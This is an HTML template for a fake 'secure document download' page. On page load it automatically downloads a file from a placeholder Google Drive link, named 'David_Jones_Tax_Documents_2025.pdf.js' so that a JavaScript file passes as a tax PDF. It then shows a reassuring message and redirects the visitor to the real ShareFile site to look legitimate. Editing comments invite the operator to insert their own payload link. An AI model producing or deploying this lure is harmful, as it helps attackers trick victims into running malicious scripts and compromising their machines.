<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Document Download</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 80px 20px;
            background: #f4f7fa;
            color: #333;
        }
        h1 { color: #1a73e8; }
        p { max-width: 600px; margin: 20px auto; font-size: 18px; }
    </style>
</head>
<body>
    <h1>Preparing your secure document...</h1>
    <p>Your file is being downloaded securely. Please wait a moment.</p>

    <script>
        function startDownloadAndRedirect() {
            // === CHANGE THIS LINE WITH YOUR DIRECT DOWNLOAD LINK ===
            const fileUrl = "https://drive.google.com/uc?export=download&id=PUT_YOUR_FILE_ID_HERE";

            const filename = "David_Jones_Tax_Documents_2025.pdf.js";   // Change this if you used a different name

            // Trigger download
            const link = document.createElement('a');
            link.href = fileUrl;
            link.download = filename;   // Forces the exact filename
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            // Show success message
            document.body.innerHTML = `
                <h1>Download started!</h1>
                <p><strong>${filename}</strong> is downloading now.</p>
                <p>You will be redirected to ShareFile shortly...</p>
            `;

            // Redirect after 2.5 seconds
            setTimeout(() => {
                window.location.href = "https://www.sharefile.com/";
            }, 2500);
        }

        window.onload = startDownloadAndRedirect;
    </script>
</body>
</html>
